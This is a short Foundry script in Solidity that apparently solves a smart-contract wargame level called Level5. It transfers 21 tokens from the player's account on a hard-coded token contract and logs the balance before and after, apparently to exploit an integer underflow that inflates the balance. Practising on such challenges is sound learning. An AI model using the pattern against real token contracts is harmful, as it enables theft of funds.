// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface Token {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract Level5 is Script {
    Token instance = Token(0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Balance: ", instance.balanceOf(vm.envAddress("PLAYER_ADDRESS")));
        instance.transfer(address(0), 21);
        console.log("Balance after: ", instance.balanceOf(vm.envAddress("PLAYER_ADDRESS")));
        vm.stopBroadcast();
    }
}